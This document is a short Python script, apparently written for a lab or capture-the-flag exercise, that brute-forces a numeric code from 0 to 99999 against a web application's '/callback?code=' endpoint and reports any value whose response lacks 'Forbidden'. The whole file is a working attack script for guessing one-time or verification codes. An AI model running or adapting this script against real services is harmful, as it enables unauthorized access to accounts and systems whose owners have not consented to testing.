import requests, sys, time

def brute():
    try:
        value = range(100000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/callback?code='+str(val))
            if "Forbidden" not in r.text:
                print("Number found!", val)
                time.sleep(20)
            elif r.status_code == 200:
                print(f"Trying {val}")
    except IndexError:
        print("Enter a URL E.g.: http://<lab-ip>/")

brute()